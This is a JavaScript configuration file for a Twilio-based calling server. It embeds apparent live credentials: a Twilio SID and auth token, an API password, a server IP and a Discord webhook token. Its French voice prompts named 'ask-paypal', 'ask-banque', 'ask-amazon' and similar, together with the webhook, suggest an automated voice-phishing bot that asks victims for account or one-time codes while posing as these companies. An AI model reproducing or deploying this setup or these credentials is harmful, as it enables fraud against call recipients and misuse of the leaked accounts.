module.exports = {
    setupdone: 'true',

    /**
     * * Information about the Twilio account
     */
    accountSid: 'ACf3459116c43191505c36aa5133ba5472',
    authToken: '74e8dfa290381549b34d43b7e7536afb',
    callerid: '+yourcallerid',

    /**
     * Information about the API
     */
    apipassword: 'ZSy5udt4gigqPPLVyhOtisXW8GNunmYF',
    serverurl: 'http://3.235.241.104:1337',

    /**
     * Information about the discord webhook
     */
    discordwebhook: 'https://discord.com/api/webhooks/920823606852849694/URGObBXM38kzYJ09qLuLSrK30gJfEBFGL7n5t3VpilNxM5MrFA-AdaUjnPmEKW2M571E',

    /**
     * Port on which the express server is running
     */
    port: process.env.PORT || 1337,

    /**
     * Audio file storage paths
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     */
    paypalsms: 'pp test 123'
};
